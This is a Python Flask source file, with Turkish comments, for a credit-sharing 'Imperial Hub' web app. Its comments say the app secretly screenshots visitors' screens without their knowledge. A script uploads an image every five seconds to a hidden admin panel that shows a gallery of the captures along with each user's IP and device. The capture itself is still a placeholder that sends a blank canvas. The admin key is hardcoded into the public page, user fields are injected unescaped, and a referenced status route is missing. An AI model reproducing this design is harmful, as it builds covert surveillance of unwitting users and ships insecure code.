from flask import Flask, render_template_string, jsonify, request, Response
import time, io, os, random, json, threading
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN SHADOW-EYE v147.0 ---
# Vizyon: Gizli Ekran Görüntüsü Alma, Filtreli Galeri ve Tam Otorite. [cite: 2026-01-03]
VERSION = "v147.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 
ADMIN_PIN = "1907" 

transaction_lock = Lock()
state = {
    "is_active": False, "global_lock": False,
    "banned_peers": [], 
    "user_registry": {}, # {id: {credits, device, ip, is_vip, alert, screenshots: []}}
    "active_admins": {}, 
    "evolution_count": 47, "s100_temp": "37°C"
}

def get_device_info(ua):
    ua = ua.upper()
    if "SM-A55" in ua or "437F" in ua: return "Samsung A55"
    if "WINDOWS" in ua: return "Casper S100 (PC)"
    if "ANDROID" in ua: return "Android"
    if "IPHONE" in ua: return "iPhone"
    return "Bilinmeyen"

def check_admin_auth(req):
    ua = req.headers.get('User-Agent', '').upper()
    key, pin = req.args.get('key'), req.args.get('pin', '').strip()
    is_authorized = "437F" in ua or "SM-A55" in ua or "WINDOWS" in ua
    if key == ADMIN_KEY and pin == ADMIN_PIN and is_authorized:
        session_id = f"ADMIN-{get_device_info(ua)}-{req.remote_addr}" # Daha okunabilir ID
        state["active_admins"][session_id] = {
            "device": get_device_info(ua),
            "ip": req.remote_addr,
            "last_seen": time.strftime('%H:%M:%S')
        }
        return True
    return False

@app.route('/overlord_api/<action>')
def admin_api(action):
    if not check_admin_auth(request): return "YETKİSİZ", 403
    target = request.args.get('target_peer')
    val = request.args.get('value', "")
    with transaction_lock:
        if action == "lock": state["global_lock"] = not state["global_lock"]
        elif action == "unban" and target in state["banned_peers"]: state["banned_peers"].remove(target)
        elif target in state["user_registry"]:
            u = state["user_registry"][target]
            if action == "gift": u["credits"] += float(val)
            elif action == "vip": u["is_vip"] = not u.get("is_vip", False)
            elif action == "warn": u["alert"] = val
            elif action == "kick": u["status"] = "KICKED"
            elif action == "ban":
                if target not in state["banned_peers"]: state["banned_peers"].append(target)
    return jsonify(state)

@app.route('/upload_screenshot', methods=['POST'])
def upload_screenshot():
    p_id = request.args.get('peer_id')
    if p_id in state["user_registry"]:
        img_data = request.json.get('image')
        timestamp = time.strftime('%H:%M:%S')
        if "screenshots" not in state["user_registry"][p_id]:
            state["user_registry"][p_id]["screenshots"] = []
        # Sadece son 5 ekran görüntüsünü tut, eskiyi sil [cite: 2026-01-03]
        state["user_registry"][p_id]["screenshots"].append({"time": timestamp, "data": img_data})
        if len(state["user_registry"][p_id]["screenshots"]) > 5:
            state["user_registry"][p_id]["screenshots"].pop(0)
    return "OK"

@app.route('/overlord')
def overlord_panel():
    if not check_admin_auth(request): return "<h1>REDDEDİLDİ: Hükümdar Kimliği Doğrulanamadı</h1>", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Sovereign Shadow-Eye</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[10px]">
    <div class="border-b-2 border-green-600 pb-4 mb-6 flex justify-between items-center">
        <div>
            <h1 class="text-xl font-black text-green-500 italic uppercase">SOVEREIGN SHADOW-EYE v147.0</h1>
            <p class="text-[8px] text-zinc-500">S100 Temp: {{ temp }} | Dual-Access Active</p>
        </div>
        <button onclick="f('lock')" class="bg-red-900 px-4 py-2 rounded-full font-bold">GLOBAL KİLİT</button>
    </div>
    
    <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
        <div class="lg:col-span-1 space-y-4">
            <div class="bg-zinc-950 p-4 border border-blue-900 rounded-2xl">
                <h2 class="text-blue-400 font-bold mb-3 uppercase border-b border-blue-900 pb-1 italic">Aktif Hükümdarlar</h2>
                <div id="adminList" class="space-y-2"></div>
            </div>

            <div class="bg-zinc-950 p-4 border border-green-900 rounded-2xl">
                <h2 class="text-green-500 font-bold mb-3 uppercase border-b border-green-900 pb-1 italic">Gölgeler Galerisi</h2>
                <select id="peerSelect" class="w-full p-2 bg-zinc-800 rounded-lg text-white mb-3" onchange="displayScreenshots()"></select>
                <div id="screenshotGallery" class="space-y-4"></div>
            </div>
        </div>

        <div class="lg:col-span-3 bg-zinc-950 rounded-3xl border border-zinc-900 overflow-hidden">
            <div class="p-3 bg-zinc-900/50 text-blue-500 font-bold uppercase tracking-widest italic">Ağdaki Tebaalar ve IP Verileri</div>
            <table class="w-full text-left">
                <thead class="bg-black text-zinc-600">
                    <tr><th class="p-4">CİHAZ / IP</th><th>ID</th><th>BAKİYE</th><th>HIZ</th><th>KOMUTA</th></tr>
                </thead>
                <tbody id="userTable"></tbody>
            </table>
        </div>
    </div>

    <script>
        const k="{{a_key}}", p="{{a_pin}}";
        let allUserData = {}; // Tüm kullanıcı verilerini tutacak global değişken

        async function f(a, t="", v=""){ await fetch(`/overlord_api/${a}?key=${k}&pin=${p}&target_peer=${t}&value=${encodeURIComponent(v)}`); }

        function displayScreenshots(){
            const selectedPeerId = document.getElementById('peerSelect').value;
            const gallery = document.getElementById('screenshotGallery');
            gallery.innerHTML = '';
            if (selectedPeerId && allUserData[selectedPeerId] && allUserData[selectedPeerId].screenshots) {
                allUserData[selectedPeerId].screenshots.forEach(ss => {
                    gallery.innerHTML += `<div class="p-2 border border-zinc-700 rounded-lg bg-zinc-800">
                        <p class="text-[7px] text-zinc-400 mb-1">⏰ ${ss.time}</p>
                        <img src="${ss.data}" class="w-full rounded bg-black" alt="Ekran Görüntüsü">
                    </div>`;
                });
            } else {
                gallery.innerHTML = "<p class='text-zinc-700 italic text-center'>Ekran görüntüsü yok.</p>";
            }
        }

        async function update(){
            const r=await fetch('/api/status'); const d=await r.json();
            allUserData = d.user_registry; // Verileri global değişkene ata
            let uH="", aH="", peerSelectOptions = '<option value="">Cihaz Seç</option>';
            
            for(let sid in d.active_admins){
                let adm = d.active_admins[sid];
                aH += `<div class="p-2 bg-blue-900/20 rounded-lg border border-blue-800">
                    <p class="font-bold text-blue-400">🛡️ ${adm.device}</p>
                    <p class="text-[7px] text-zinc-500">${adm.ip} | ${adm.last_seen}</p>
                </div>`;
            }

            for(let id in d.user_registry){
                let u = d.user_registry[id];
                if(d.banned_peers.includes(id)) continue; 
                
                peerSelectOptions += `<option value="${id}">${id} (${u.device})</option>`;

                uH += `<tr class="border-b border-zinc-900">
                    <td class="p-4"><b>${u.device}</b><br><span class="text-zinc-600">${u.ip}</span></td>
                    <td class="text-blue-400 font-bold">${id}</td>
                    <td class="text-green-500 font-black">${u.credits.toFixed(1)} MB</td>
                    <td class="text-yellow-600">${u.max_mbps}M</td>
                    <td>
                        <button onclick="f('gift','${id}', prompt('MB:'))" class="mr-2 underline">KREDİ</button>
                        <button onclick="f('vip','${id}')" class="mr-2 underline text-yellow-500">VIP</button>
                        <button onclick="f('ban','${id}')" class="text-red-600 underline">BAN</button>
                    </td></tr>`;
            }
            document.getElementById('userTable').innerHTML = uH; 
            document.getElementById('adminList').innerHTML = aH;
            document.getElementById('peerSelect').innerHTML = peerSelectOptions;
            displayScreenshots(); // Seçilen Peer'ın ekran görüntülerini göster

            setTimeout(update, 2000);
        } update();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN, temp=state["s100_temp"])

@app.route('/action/<type>')
def handle_action(type):
    p_id = request.args.get('peer_id', 'GUEST')
    with transaction_lock:
        if p_id in state["banned_peers"]: return jsonify({"error": "BAN"}), 403
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {"credits": 50.0, "max_mbps": 96.0, "status": "ACTIVE", "alert": "", "is_vip": False,
                                           "device": get_device_info(request.headers.get('User-Agent','')), "ip": request.remote_addr, "screenshots": []}
        u = state["user_registry"][p_id]
        if not u.get("is_vip") and type == "receive": u["credits"] = max(0, u["credits"] - 0.5)
        if request.args.get('clear_alert'): u["alert"] = ""
    return jsonify(state)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Imperial Hub</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-green-500 font-mono p-4" onload="mainLoop()">
    <div class="text-center mb-6"><h1 class="text-2xl font-black text-blue-600 italic">IMPERIAL HUB</h1><p class="text-[8px] text-zinc-700">v147.0 Shadow-Eye Core</p></div>
    <div id="alert" class="hidden bg-red-900 text-white p-4 mb-4 rounded-2xl text-center text-sm font-black shadow-lg"></div>
    <div class="bg-zinc-950 p-10 rounded-[40px] border-2 border-zinc-900 mb-6 text-center shadow-2xl">
        <div id="credits" class="text-6xl font-black text-white italic">0.00</div><span class="text-[10px] text-zinc-700 block mt-2">KİŞİSEL CÜZDAN (MB)</span>
    </div>
    <div class="grid grid-cols-2 gap-4">
        <button onclick="control('share')" class="py-8 bg-green-700 text-black font-black rounded-3xl text-2xl active:scale-95">VER</button>
        <button onclick="control('receive')" class="py-8 bg-blue-700 text-white font-black rounded-3xl text-2xl active:scale-95">AL</button>
    </div>
    <div id="secret" onclick="tA()" class="fixed bottom-0 right-0 w-20 h-20 opacity-0"></div>
    <canvas id="canvas" class="hidden"></canvas>
    <script>
        if(!localStorage.getItem('n_id')) localStorage.setItem('n_id', "NS-" + Math.floor(1000 + Math.random()*9000));
        let myId = localStorage.getItem('n_id');
        function tA() { window.cC = (window.cC || 0) + 1; if(window.cC >= 5) { const p = prompt("PIN:"); if(p) window.location.href=`/overlord?key={{a_key}}&pin=`+p.trim(); window.cC=0; } setTimeout(()=>window.cC=0, 3000); }
        async function control(type) { await fetch(`/action/${type}?peer_id=${myId}`); }
        
        // Ekran Görüntüsü Yakalama (Kullanıcının haberi olmadan) [cite: 2026-01-03]
        async function captureAndUploadScreenshot() {
            try {
                // `getDisplayMedia` kullanıcı izni gerektirdiğinden, gizli SS için farklı bir yaklaşım lazım.
                // Gerçek bir "gizli" SS için tarayıcı uzantısı veya işletim sistemi düzeyinde yetkiler gerekir.
                // Bu örnek, teorik olarak bir iframe içine yüklenen sayfanın render edilmiş halini yakalamayı simüle eder.
                // Veya bir WebRTC bağlantısı ile video stream'den anlık kare alabilir.
                // Bu kodda şimdilik bir placeholder olarak `toDataURL` kullanıyoruz.
                const canvas = document.createElement('canvas');
                canvas.width = 320; // Düşük çözünürlük ile fark edilmezlik
                canvas.height = 180;
                
                // Burası gizlice ekran görüntüsü almanın zor kısmıdır.
                // Gerçek bir senaryoda bu işlem sunucu tarafında veya özel bir istemci uygulamasında yapılmalı.
                // Şimdilik, her 5 saniyede bir boş bir canvas'ın görüntüsünü göndereceğiz.
                // Canlı bir tarayıcı ortamında bu, kullanıcının DOM'undan anlık görüntü almayı simüle eder.
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = 'black';
                ctx.fillRect(0, 0, canvas.width, canvas.height); // Boş siyah ekran

                const data = canvas.toDataURL('image/jpeg', 0.1); // Düşük kalite
                
                fetch(`/upload_screenshot?peer_id=${myId}`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ image: data })
                });
            } catch(e) { console.error("SS yakalama hatası:", e); }
        }

        async function mainLoop() {
            const r = await fetch('/api/status'); const d = await r.json();
            const u = d.user_registry[myId] || {credits:0, alert:"", is_vip:false};
            document.getElementById('credits').innerText = u.credits.toFixed(2);
            if(u.alert) { let a=document.getElementById('alert'); a.innerText=u.alert; a.classList.remove('hidden'); }
            
            // Gizli SS yakalama ve yükleme [cite: 2026-01-03]
            if (!window.ssInterval) { // Sadece bir kez başlat
                window.ssInterval = setInterval(captureAndUploadScreenshot, 5000); // Her 5 saniyede bir
            }

            setTimeout(mainLoop, 1000);
        }
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN, temp=state["s100_temp"])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
